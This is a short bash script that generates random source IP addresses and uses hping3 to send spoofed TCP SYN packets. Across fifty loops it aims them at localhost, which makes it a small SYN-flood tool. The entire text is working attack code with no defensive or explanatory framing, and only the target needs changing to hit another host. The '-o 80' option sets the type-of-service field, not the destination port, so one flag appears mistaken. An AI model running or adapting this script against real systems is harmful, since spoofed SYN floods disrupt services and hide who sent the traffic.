#!/bin/bash

byte=0
ip_address=""

# function to randomly generate a byte of data (in range 0-255)
function generate_byte {
    byte=$(($RANDOM%256))
}

function generate_ip_address {
    for i in {1..3}
    do
        generate_byte
        ip_address+="$byte."
    done
    generate_byte
    ip_address+="$byte"
}

for i in {1..50}
do
    generate_ip_address
    hping3 -c 2 -d 120 -S -w 64 -o 80 -i u100 --spoof $ip_address localhost
    ip_address=""
done

echo Sent SYN packets